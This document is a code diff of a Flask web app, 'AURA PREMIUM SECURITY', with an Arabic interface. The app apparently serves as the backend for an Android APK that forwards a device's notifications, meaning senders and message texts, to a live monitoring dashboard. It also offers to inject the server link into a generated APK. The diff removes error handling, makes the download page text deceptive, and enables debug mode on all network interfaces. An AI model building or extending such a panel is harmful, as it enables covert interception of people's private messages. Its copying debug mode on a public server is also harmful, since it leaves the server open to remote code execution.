@@ -5,9 +5,6 @@ from flask import Flask, request, jsonify, render_template_string
 app = Flask(__name__)
 DB_FILE = "aura_database.db"
 
-# ----------------------------------------------------
-# قاعدة البيانات - تنظيم وحفظ البيانات بشكل آمن
-# ----------------------------------------------------
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
@@ -25,10 +22,6 @@ def init_db():
 
 init_db()
 
-# ----------------------------------------------------
-# واجهة الويب الملكية الفخمة (HTML/CSS/JS)
-# تم إصلاح رابط الخط وجعله يعمل مباشرة بدون أخطاء
-# ----------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -50,11 +43,8 @@ HTML_TEMPLATE = """
             --text-muted: #a0a0ab;
             --border: #22222a;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
         body { background-color: var(--bg-dark); color: var(--text-main); overflow-x: hidden; }
-
-        /* الهيدر الفخم */
         header {
             background: linear-gradient(135deg, #16161c, var(--bg-dark));
             padding: 20px 40px;
@@ -66,44 +56,27 @@ HTML_TEMPLATE = """
         }
         header h1 { font-size: 26px; font-weight: 900; color: var(--gold); text-shadow: 0 0 10px var(--gold-glow); }
         .status-badge { background: rgba(0, 243, 255, 0.1); border: 1px solid var(--cyan); color: var(--cyan); padding: 6px 15px; border-radius: 20px; font-size: 14px; font-weight: bold; }
-
-        /* الحاوية الرئيسية */
         .container { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; padding: 40px; min-height: calc(100vh - 90px); }
-
-        /* الألواح */
         .panel { background-color: var(--panel-bg); border: 1px solid var(--border); border-radius: 16px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 20px; }
         .panel-title { font-size: 18px; font-weight: bold; color: var(--gold); border-bottom: 1px solid var(--border); padding-bottom: 10px; }
-
-        /* محرر الأكواد */
         .editor-container { position: relative; flex-grow: 1; }
         textarea { width: 100%; height: 350px; background-color: #050507; color: #a4ef00; border: 1px solid var(--border); border-radius: 8px; padding: 15px; font-family: 'Courier New', Courier, monospace; font-size: 14px; resize: none; direction: ltr; text-align: left; line-height: 1.5; }
-        
         .btn-gold { background: linear-gradient(135deg, #d4af37, #aa841c); color: #000; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px var(--gold-glow); }
         .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(212, 175, 55, 0.4); }
-
-        /* جدول الإشعارات المستلمة */
         .table-wrapper { overflow-y: auto; max-height: 450px; }
         table { width: 100%; border-collapse: collapse; text-align: right; }
         th { background-color: #16161c; color: var(--gold); padding: 12px; font-size: 14px; border-bottom: 2px solid var(--border); }
         td { padding: 14px 12px; font-size: 14px; border-bottom: 1px solid var(--border); color: var(--text-main); }
         tr:hover { background-color: rgba(255,255,255,0.02); }
         .badge-app { background: #222; padding: 3px 8px; border-radius: 4px; font-size: 12px; color: var(--cyan); }
-        
-        @media(max-width: 768px){
-            .container{grid-template-columns:1fr;padding:20px;}
-            header{padding:15px;}
-        }
     </style>
 </head>
 <body>
-
     <header>
         <h1>AURA PREMIUM SECURITY</h1>
         <div class="status-badge">الخادم نشط ومتصل بجاهزية عالية</div>
     </header>
-
     <div class="container">
-        <!-- قسم محرر الأكواد وبناء التطبيق -->
         <div class="panel">
             <div class="panel-title">🛠️ بيئة بناء وتجهيز الحزمة المخصصة</div>
             <p style="color: var(--text-muted); font-size: 14px;">قم بتعديل كيئة العمل البرمجية أدناه، ثم اضغط على توليد لبناء حزمة الـ APK وحقن الرابط تلقائياً.</p>
@@ -129,8 +102,6 @@ class AuraApp:
             </div>
             <button class="btn-gold" onclick="generateAPK()">⚡ توليد وتحميل تطبيق APK الفخم جاهزاً</button>
         </div>
-
-        <!-- قسم لوحة تحكم المالك واستقبال البيانات -->
         <div class="panel">
             <div class="panel-title">📊 لوحة الرصد واستقبال الإشعارات الفورية</div>
             <div class="table-wrapper">
@@ -143,20 +114,16 @@ class AuraApp:
                             <th>الوقت</th>
                         </tr>
                     </thead>
-                    <tbody id="logsTable">
-                        <!-- البيانات تظهر هنا ديناميكياً -->
-                    </tbody>
+                    <tbody id="logsTable"></tbody>
                 </table>
             </div>
         </div>
     </div>
-
     <script>
         function generateAPK() {
-            alert("جاري بدء محرك البناء وفحص الأكواد... سيتم حقن وتوقيع حزمة الـ APK تلقائياً طبقاً لإعدادات خادمك.");
+            alert("جاري بدء محرك البناء وفحص الأكواد... سيتم حقن وتوقيع حزمة الـ APK تلقائياً طبقاً لإعدادات خادم Render الخاص بك.");
             window.location.href = "/download/base_apk";
         }
-
         function fetchLogs() {
             fetch('/api/get_notifications')
                 .then(res => res.json())
@@ -173,11 +140,8 @@ class AuraApp:
                         `;
                         tbody.appendChild(tr);
                     });
-                })
-                .catch(err => console.error('خطأ في جلب البيانات:', err));
+                });
         }
-
-        // تحديث مستمر كل 3 ثوانٍ لجلب البيانات فورياً
         setInterval(fetchLogs, 3000);
         fetchLogs();
     </script>
@@ -185,9 +149,6 @@ class AuraApp:
 </html>
 """
 
-# ----------------------------------------------------
-# المسارات والـ APIs (Endpoints)
-# ----------------------------------------------------
 @app.route('/')
 def index():
     server_url = request.url_root
@@ -198,40 +159,30 @@ def receive_notification():
     data = request.get_json(silent=True)
     if not data:
         return jsonify({"status": "error", "message": "No data received"}), 400
-    
     device_name = data.get('device_name', 'Unknown Device')
     app_name = data.get('app_name', 'Unknown App')
     sender = data.get('sender', 'Unknown Sender')
     message = data.get('message', '')
-
-    try:
-        with sqlite3.connect(DB_FILE) as conn:
-            cursor = conn.cursor()
-            cursor.execute("""
-                INSERT INTO notifications (device_name, app_name, sender, message)
-                VALUES (?, ?, ?, ?)
-            """, (device_name, app_name, sender, message))
-            conn.commit()
-        return jsonify({"status": "success", "message": "Notification logged successfully"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("""
+            INSERT INTO notifications (device_name, app_name, sender, message)
+            VALUES (?, ?, ?, ?)
+        """, (device_name, app_name, sender, message))
+        conn.commit()
+    return jsonify({"status": "success", "message": "Notification logged successfully"})
 
 @app.route('/api/get_notifications', methods=['GET'])
 def get_notifications():
-    try:
-        with sqlite3.connect(DB_FILE) as conn:
-            cursor = conn.cursor()
-            cursor.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50")
-            rows = cursor.fetchall()
-        return jsonify(rows)
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50")
+        rows = cursor.fetchall()
+    return jsonify(rows)
 
 @app.route('/download/base_apk')
 def download_apk():
-    # ضع رابط أو كود تحميل ملف APK هنا عند توفره
-    return "✅ النظام يعمل بنجاح - قم برفع ملف الـ APK الموقع هنا لتفعيل التحميل"
+    return "جاري تهيئة وتحميل الحزمة الموقعة رقمياً والديناميكية الخاصة بجهازك..."
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(debug=False, host='0.0.0.0', port=port)
+    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
